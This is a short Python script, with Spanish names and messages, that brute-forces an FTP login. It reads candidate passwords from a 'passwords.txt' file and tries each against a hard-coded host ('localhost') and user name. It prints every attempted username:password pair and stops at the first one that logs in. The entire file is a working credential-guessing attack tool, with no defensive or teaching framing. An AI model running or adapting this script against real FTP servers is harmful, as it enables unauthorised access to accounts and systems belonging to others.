from ftplib import FTP

def intento_inicio_sesion_ftp(host, nombre_usuario, contraseña):
  ftp = FTP(host)
  try:
    ftp.login(nombre_usuario, contraseña)
    print(f"Inicio de sesión exitoso con {nombre_usuario}:{contraseña}")
    ftp.quit()
    return True
  except:
    print(f"Fallo en el inicio de sesión con {nombre_usuario}:{contraseña}")
    return False

def intento_crack_password(host, nombre_usuario, contraseñas):
  for contraseña in contraseñas:
    if intento_inicio_sesion_ftp(host, nombre_usuario, contraseña):
      break

def leer_contraseñas(archivo):
  with open(archivo, 'r') as f:
    contraseñas = f.read().splitlines()
  return contraseñas

host = 'localhost'
nombre_usuario = 'usuario'
contraseñas = leer_contraseñas('passwords.txt')

intento_crack_password(host, nombre_usuario, contraseñas)